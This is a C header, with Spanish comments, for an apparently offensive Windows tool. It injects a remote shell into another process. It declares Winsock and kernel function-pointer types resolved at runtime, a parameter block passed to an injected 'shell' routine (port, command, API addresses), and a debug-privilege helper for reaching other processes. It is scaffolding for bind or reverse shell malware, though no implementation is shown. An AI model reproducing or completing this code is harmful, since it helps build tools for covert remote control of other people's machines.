#ifndef __INJECT__
#define __INJECT__

#include <stdio.h>
#include <winsock2.h>

#include <Winbase.h>
#include <process.h>
#include <Tlhelp32.h>
//#include <windows.h>

#ifndef __BORLANDC__
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib,"advapi32.lib")

   // #pragma comment(lib,"advapi32.lib")
    //#pragma comment(lib,"Netapi32.lib")
    //#pragma comment(lib,"Kernel32.lib")
#endif



//prototipos..
typedef int     (WINAPI *BIND) (  SOCKET s,const struct sockaddr* name,int namelen);
typedef SOCKET  (WINAPI *ACCEPT) (SOCKET s,struct sockaddr* addr,int* addrlen);
typedef int     (WINAPI *LISTEN) (SOCKET s,int backlog);
typedef int     (WINAPI *WSASTARTUP) (WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET (WINAPI *WSASOCKET) ( int af,int type,int protocol,LPWSAPROTOCOL_INFO lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef int (WINAPI *WSACONNECT) ( SOCKET s,const struct sockaddr* name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef BOOL (WINAPI * CREATEPROCESS) (
  LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
typedef HMODULE (WINAPI *LOADLIBRARY)(LPCTSTR lpFileName);
typedef FARPROC (WINAPI *GETPROCADDRESS) (  HMODULE hModule,  LPCSTR lpProcName);

//Parametros de Configuraci�n
typedef struct _parametros{
    HANDLE      WSAHandle;
    char        wsastring[20];  //Ws2_32.dll
    HANDLE      KernelHandle;
    char        kernelstring[20]; //kernel32.dll

    WSASTARTUP  ShellWsaStartup;
    char        wsastartupstring[20]; // WSAStartup

    WSASOCKET   ShellWSASocket;
    char        WSASocketString[20];  //WSASocketW

    WSACONNECT  ShellWsaConnect;
    char        WSAConnectstring[20]; //WSAConnect

    BIND        ShellBind;
    char        bindstring[20]; //bind

    ACCEPT      ShellAccept;
    char        acceptstring[10]; //accept

    LISTEN      ShellListen;
    char        listenstring[10]; //listen

    CREATEPROCESS   KernelCreateProcess;
    char        CreateProcessstring[20];

    LOADLIBRARY     KernelLoadLibrary;
    GETPROCADDRESS  KernelGetProcAddress;


    unsigned short port;
    DWORD startup;
    unsigned short sizeofsa;
    unsigned short sizeofsi;


    char cmd[255];
    DWORD Zero;
    void *nulo;
//    HANDLE      UserHandle;
//    MESSAGEBOX USERMessageBox;
//    char        UserMessageBoxString[15];

} PARAMETROS;

typedef struct _OWNER{
   DWORD  pid;
   TCHAR  username[256];
   TCHAR domainname[256];
} OWNER;


void __stdcall shell( PARAMETROS* );
//BOOL EnableDebugPriv( void );
int EnableDebugPriv( HANDLE proceso,LPCTSTR lpName );
void doFormatMessage( unsigned int dwLastErr );


#endif